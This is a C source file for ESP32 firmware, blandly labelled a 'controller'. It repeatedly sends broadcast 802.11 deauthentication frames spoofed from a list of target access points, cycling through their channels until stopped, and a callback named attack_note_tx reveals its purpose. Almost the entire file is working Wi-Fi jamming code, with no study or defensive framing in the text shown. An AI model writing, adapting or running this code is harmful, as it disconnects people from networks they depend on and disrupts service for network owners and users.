/* Port of the supplied controller; one cooperative task owns all transmissions. */
#include "controller.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_rom_sys.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include <stdatomic.h>
#include <string.h>

static wifi_ap_record_t selected[MAX_JOB_TARGETS];
static unsigned target_count;
static atomic_bool running;
static SemaphoreHandle_t stopped;

static void transmit_task(void *arg) {
    while (atomic_load(&running)) {
        for (unsigned i = 0; i < target_count && atomic_load(&running); ++i) {
            esp_err_t channel = esp_wifi_set_channel(selected[i].primary, WIFI_SECOND_CHAN_NONE);
            uint8_t frame[26] = {0xc0};
            memset(frame + 4, 0xff, 6);
            memcpy(frame + 10, selected[i].bssid, 6); memcpy(frame + 16, selected[i].bssid, 6);
            frame[24] = 1;
            for (unsigned j = 0; j < 25 && atomic_load(&running); ++j) {
                esp_err_t err = channel == ESP_OK ? esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false) : channel;
                attack_note_tx(err == ESP_OK, i);
                esp_rom_delay_us(1000);
            }
            vTaskDelay(1);
        }
    }
    xSemaphoreGive(stopped);
    vTaskDelete(NULL);
}
esp_err_t controller_start(const wifi_ap_record_t *targets, unsigned count) {
    if (!targets || !count || count > MAX_JOB_TARGETS || atomic_load(&running)) return ESP_ERR_INVALID_ARG;
    if (!stopped) stopped = xSemaphoreCreateBinary();
    if (!stopped) return ESP_ERR_NO_MEM;
    xSemaphoreTake(stopped, 0);
    memcpy(selected, targets, count * sizeof(*targets)); target_count = count;
    esp_err_t err = esp_wifi_set_promiscuous(true);
    if (err != ESP_OK) return err;
    atomic_store(&running, true);
    if (xTaskCreate(transmit_task, "controller", 4096, NULL, 4, NULL) != pdPASS) {
        atomic_store(&running, false); esp_wifi_set_promiscuous(false); return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}
void controller_stop(void) {
    if (atomic_exchange(&running, false)) xSemaphoreTake(stopped, portMAX_DELAY);
    esp_wifi_set_promiscuous(false);
}
